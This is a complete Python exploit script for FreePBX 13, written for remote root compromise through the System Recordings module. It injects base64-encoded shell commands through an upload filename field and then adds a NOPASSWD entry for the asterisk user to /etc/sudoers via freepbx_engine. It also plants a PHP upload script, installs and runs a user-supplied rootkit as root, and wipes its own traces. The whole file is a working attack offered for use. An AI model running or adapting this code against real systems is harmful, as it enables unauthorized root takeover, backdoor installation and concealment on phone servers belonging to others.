#!/usr/bin/env python
# -*- coding, latin-1 -*- ######################################################
#                                                                              #
# DESCRIPTION                                                                  #
# FreePBX 13 remote root 0day - Found and exploited by pgt @ nullsecurity.net  #
#                                                                              #
# AUTHOR                                                                       #
# pgt - nullsecurity.net                                                       #
#                                                                              #
# DATE                                                                         #
# 8-12-2016                                                                    #
#                                                                              #
# VERSION                                                                      #
# freepbx0day.py 0.1                                                           #
#                                                                              #
# AFFECTED VERSIONS                                                            #
# FreePBX 13 & 14 (System Recordings Module versions: 13.0.1beta1 - 13.0.26)   #
#                                                                              #
# STATUS                                                                       #
# Fixed 08-10-2016 - http://issues.freepbx.org/browse/FREEPBX-12908            #
#                                                                              #
# TESTED AGAINST                                                               #
# * http://downloads.freepbxdistro.org/ISO/FreePBX-64bit-10.13.66.iso          #
# * http://downloads.freepbxdistro.org/ISO/FreePBX-32bit-10.13.66.iso          #
#                                                                              #
# TODO                                                                         #
# * SSL support (priv8)                                                        #
# * parameter for TCP port                                                     #
#                                                                              #
# HINT                                                                         #
# Base64 Badchars: '+', '/', '='                                               #
#                                                                              #
################################################################################

'''
Successful exploitation should looks like:

[*] enum FreePBX version
[+] target running FreePBX 13
[*] checking if target is vulnerable
[+] target seems to be vulnerable
[*] getting kernel version
[!] Kernel: Linux localhost.localdomain 2.6.32-504.8.1.el6.x86_64 ....
[+] Linux x86_64 platform
[*] adding 'echo "asterisk ALL=(ALL) NOPASSWD:...' to freepbx_engine
[*] triggering incrond to gaining root permissions via sudo
[*] waiting 20 seconds while incrond restarts applications - /_!_\ VERY LOUD!
[*] removing 'echo "asterisk ALL=(ALL) NOPASSWD:...' from freepbx_engine
[*] checking if we gained root permissions
[!] w00tw00t w3 r r00t - uid=0(root) gid=0(root) groups=0(root)
[+] adding view.php to admin/.htaccess
[*] creating upload script: admin/libraries/view.php
[*] uploading ${YOUR_ROOTKIT} to /tmp/23 via admin/libraries/view.php
[*] removing view.php from admin/.htaccess
[*] rm -f admin/libraries/view.php
[!] execute: chmod +x /tmp/23; sudo /tmp/23 & sleep 0.1; rm -f /tmp/23
[*] removing 'asterisk ALL=(ALL) NOPASSWD:ALL' from /etc/sudoers
[*] removing all temp files
[!] have fun and HACK THE PLANET!
'''


import base64
import httplib
import optparse
import re
from socket import *
import sys
import time


BANNER = '''\033[0;31m
################################################################################
#___________                    ________________________  ___   ____________   #
#\_   _____/______   ____   ____\______   \______   \   \/  /  /_   \_____  \  #
# |    __) \_  __ \_/ __ \_/ __ \|     ___/|    |  _/\     /    |   | _(__  <  #
# |     \   |  | \/\  ___/\  ___/|    |    |    |   \/     \    |   |/       \ #
# \___  /   |__|    \___  >\___  >____|    |______  /___/\  \   |___/______  / #
#     \/                \/     \/                 \/      \_/              \/  #
#  _______                .___                                                 #
#  \   _  \             __| _/____  ___.__.   * Remote Root 0-Day              #
#  /  /_\  \   ______  / __ |\__  \<   |  |                                    #
#  \  \_/   \ /_____/ / /_/ | / __ \ \___ |                                    #
#   \_____  /         \____ |(____  / ____|                                    #
#         \/               \/     \/\/                                         #
#                                                                              #
#       * Remote Command Execution Exploit (FreePBX 14 is affected also)       #
#       * Local Root Exploit (probably FreePBX 14 is also exploitable)         #
#       * Backdoor Upload + Execute As Root                                    #
#                                                                              #
#       * Author: pgt - nullsecurity.net                                       #
#       * Version: 0.1                                                         #
#                                                                              #
################################################################################
\033[0;m'''


def argspage():
    parser = optparse.OptionParser()

    parser.add_option('-u', default=False, metavar='<url>',
            help='ip/url to exploit')
    parser.add_option('-r', default=False, metavar='<file>',
            help='Linux 32bit bd/rootkit')
    parser.add_option('-R', default=False, metavar='<file>',
            help='Linux 64bit bd/rootkit')
    parser.add_option('-a', default='/', metavar='<path>',
            help='FreePBX path - default: \'/\'')

    args, args2 = parser.parse_args()

    if (args.u == False) or (args.r == False) or (args.R == False):
        print ''
        parser.print_help()
        print '\n'
        exit(0)

    return args


def cleanup_fe():
    print '[*] removing \'echo "asterisk ALL=(ALL) NOPASSWD:...' \
            '\' from freepbx_engine'
    cmd = 'sed -i --  \' /echo \"asterisk ALL=(ALL)  NOPASSWD\:ALL\">>' \
            '\/etc\/sudoers/d\' /var/lib/asterisk/bin/freepbx_engine'
    command_execution(cmd)

    return


def cleanup_lr():
    print '[*] removing \'echo "asterisk ALL=(ALL) NOPASSWD:...' \
            '\' from launch-restapps'
    cmd = 'sed -i -- \':r;$!{N;br};s/\\necho "asterisk.*//g\' ' \
            'modules/restapps/launch-restapps.sh'
    command_execution(cmd)

    return


def cleanup_htaccess():
    print '[*] removing view.php from admin/.htaccess'
    cmd = 'sed -i -- \'s/config\\\\.php|view\\\\.php|ajax\\\\.php/' \
            'config\\\\.php|ajax\\\\.php/g\' .htaccess'
    command_execution(cmd)

    return


def cleanup_view_php():
    print '[*] rm -f admin/libraries/view.php'
    cmd = 'rm -f libraries/view.php'
    command_execution(cmd)

    return


def cleanup_sudoers():
    print '[*] removing \'asterisk ALL=(ALL) NOPASSWD:ALL\' from /etc/sudoers'
    cmd = 'sudo sed -i -- \'/asterisk ALL=(ALL)  NOPASSWD:ALL/d\' /etc/sudoers'
    command_execution(cmd)

    return


def cleanup_tmpfiles():
    print '[*] removing all temp files'
    cmd = 'find / -name *w00t* -exec rm -f {} \; 2> /dev/null'
    command_execution(cmd)

    return


def check_platform(response):
    if (response.find('Linux') != -1) and (response.find('x86_64') != -1):
        print '[+] Linux x86_64 platform'
        return '64'
    elif (response.find('Linux') != -1) and (response.find('i686') != -1):
        print '[+] Linux i686 platform'
        cleanup_tmpfiles()
        sys.exit(1)
        return '32'
    else:
        print '[-] adjust check_platform() when you want to backdoor ' \
                'other platforms'
        cleanup_tmpfiles()
        sys.exit(1)


def check_kernel(response):
    if response.find('w00t') != -1:
        start = response.find('w00t') + 4
        end = response.find('w00tw00t') - 1
        print '[!] Kernel: %s' % (response[start:end].replace('\\', ''))

        return check_platform(response[start:end])


def check_root(response):
    if response.find('uid=0(root)') != -1:
        start = response.find('w00t') + 4
        end = response.find('w00tw00t') - 2
        print '[!] w00tw00t w3 r r00t - %s' % (response[start:end])
        return
    else:
        print '[-] we are not root :('
        cleanup_fe()
        cleanup_lr()
        cleanup_tmpfiles()
        sys.exit(1)


def build_request(filename):
    body = 'file=%s&name=a&codec=gsm&lang=ru&temporary=1' \
            '&command=convert&module=recordings' % (filename)
    content_type = 'application/x-www-form-urlencoded; charset=UTF-8'

    return content_type, body


def filter_filename(response):
    start = response.find('localfilename":"w00t') + 16
    end = response.find('.wav') + 4

    return response[start:end]


def post(path, content_type, body):
    h = httplib.HTTP(ARGS.u)
    h.putrequest('POST', '%s%s' % (ARGS.a, path))
    h.putheader('Host' , '%s' % (ARGS.u))
    h.putheader('Referer' , 'http://%s/' % (ARGS.u))
    h.putheader('Content-Type', content_type)
    h.putheader('Content-Length', str(len(body)))
    h.endheaders()
    h.send(body)
    errcode, errmsg, headers = h.getreply()

    return h.file.read()


def encode_multipart_formdata(fields, filename=None):
    LIMIT = '----------lImIt_of_THE_fIle_eW_$'
    CRLF = '\r\n'
    L = []
    L.append('--' + LIMIT)
    if fields:
        for (key, value) in fields.items():
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)
            L.append('--' + LIMIT)

    if filename == None:
        L.append('Content-Disposition: form-data; name="file"; filename="dasd"')
        L.append('Content-Type: audio/mpeg')
        L.append('')
        L.append('da')
    else:
        L.append('Content-Disposition: form-data; name="file"; filename="dasd"')
        L.append('Content-Type: application/octet-stream')
        L.append('')
        L.append(open_file(filename))

    L.append('--' + LIMIT + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % (LIMIT)

    return content_type, body


def create_fields(payload):
    fields = {'id': '1', 'name': 'aaaa', 'extension': '0', 'language': 'ru',
            'systemrecording': '', 'filename': 'w00t%s' % (payload)}

    return fields


def command_execution(cmd):
    upload_path = 'admin/ajax.php?module=recordings&command=' \
            'savebrowserrecording'
    cmd = base64.b64encode(cmd)
    payload = '`echo %s | base64 -d | sh`' % (cmd)
    fields = create_fields(payload)
    content_type, body = encode_multipart_formdata(fields)
    response = post(upload_path, content_type, body)
    filename = filter_filename(response)
    content_type, body = build_request(filename)

    return post('admin/ajax.php', content_type, body)


def check_vuln():
    h = httplib.HTTP(ARGS.u)
    h.putrequest('GET', '%sadmin/ajax.php' % (ARGS.a))
    h.putheader('Host' , '%s' % (ARGS.u))
    h.endheaders()
    errcode, errmsg, headers = h.getreply()
    response = h.file.read()

    if response.find('{"error":"ajaxRequest declined - Referrer"}') == -1:
        print '[-] target seems not to be vulnerable'
        sys.exit(1)

    upload_path = 'admin/ajax.php?module=recordings&command' \
            '=savebrowserrecording'
    payload = 'w00tw00t'
    fields = create_fields(payload)
    content_type, body = encode_multipart_formdata(fields)
    response = post(upload_path, content_type, body)

    if response.find('localfilename":"w00tw00tw00t') != -1:
        print '[+] target seems to be vulnerable'
        return
    else:
        print '[-] target seems not to be vulnerable'
        sys.exit(1)


def open_file(filename):
    try:
        f = open(filename, 'rb')
        file_content = f.read()
        f.close()
        return file_content
    except IOError:
        print '[-] %s does not exists!' % (filename)
        sys.exit(1)


def version13():
    print '[*] checking if target is vulnerable'
    check_vuln()

    print '[*] getting kernel version'
    cmd = 'uname -a; echo w00tw00t'
    response = command_execution(cmd)
    result = check_kernel(response)
    if result == '64':
        backdoor = ARGS.R
    elif result == '32':
        backdoor = ARGS.r

    print '[*] adding \'echo "asterisk ALL=(ALL) NOPASSWD:...\' ' \
            'to freepbx_engine'
    cmd = 'sed -i -- \'s/Com Inc./Com Inc.\\necho "asterisk ALL=\(ALL\)\  ' \
            'NOPASSWD\:ALL"\>\>\/etc\/sudoers/g\' /var/lib/' \
            'asterisk/bin/freepbx_engine'
    command_execution(cmd)


    print '[*] triggering incrond to gaining root permissions via sudo'
    cmd = 'echo a > /var/spool/asterisk/sysadmin/amportal_restart'
    command_execution(cmd)

    print '[*] waiting 20 seconds while incrond restarts applications' \
            ' - /_!_\\ VERY LOUD!'
    time.sleep(20)

    cleanup_fe()
    #cleanup_lr()

    print '[*] checking if we gained root permissions'
    cmd = 'sudo -n id; echo w00tw00t'
    response = command_execution(cmd)
    check_root(response)

    print '[+] adding view.php to admin/.htaccess'
    cmd = 'sed -i -- \'s/config\\\\.php|ajax\\\\.php/' \
            'config\\\\.php|view\\\\.php|ajax\\\\.php/g\' .htaccess'
    command_execution(cmd)

    print '[*] creating upload script: admin/libraries/view.php'
    cmd = 'echo \'<?php  move_uploaded_file($_FILES["file"]' \
            '["tmp_name"], "/tmp/23");?>\' > libraries/view.php'
    command_execution(cmd)

    print '[*] uploading %s to /tmp/23 via ' \
            'admin/libraries/view.php' % (backdoor)
    content_type, body = encode_multipart_formdata(False, backdoor)
    post('admin/libraries/view.php', content_type, body)

    cleanup_htaccess()
    cleanup_view_php()

    print '[!] execute: chmod +x /tmp/23; sudo /tmp/23 & sleep 0.1;' \
            ' rm -f /tmp/23'
    cmd = 'chmod +x /tmp/23; sudo /tmp/23 & sleep 0.1; rm -f /tmp/23'
    setdefaulttimeout(5)
    try:
        command_execution(cmd)
    except timeout:
        ''' l4zY w0rk '''

    setdefaulttimeout(20)
    try:
        cleanup_sudoers()
        cleanup_tmpfiles()
    except timeout:
        cleanup_tmpfiles()

    return


def enum_version():
    h = httplib.HTTP(ARGS.u)
    h.putrequest('GET', '%sadmin/config.php' % (ARGS.a))
    h.putheader('Host' , '%s' % (ARGS.u))
    h.endheaders()
    errcode, errmsg, headers = h.getreply()
    response = h.file.read()

    if response.find('FreePBX 13') != -1:
        print '[+] target running FreePBX 13'
        return 13
    else:
        print '[-] target is not running FreePBX 13'

    return False


def checktarget():
    if re.match(r'^[0-9.\-]*$', ARGS.u):
        target = ARGS.u
    else:
        try:
            target = gethostbyname(ARGS.u)
        except gaierror:
            print '[-] \'%s\' is unreachable' % (ARGS.u)

    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((target, 80))
    sock.close()
    if result != 0:
        '[-] \'%s\' is unreachable' % (ARGS.u)
        sys.exit(1)

    return

def main():
    print BANNER

    checktarget()

    open_file(ARGS.r)
    open_file(ARGS.R)

    print '[*] enum FreePBX version'
    result = enum_version()

    if result == 13:
        version13()

    print '[!] have fun and HACK THE PLANET!'

    return


if __name__ == '__main__':
    ARGS = argspage()
    try:
        main()
    except KeyboardInterrupt:
        print '\nbye bye!!!'
        time.sleep(0.01)
        sys.exit(1)

#EOF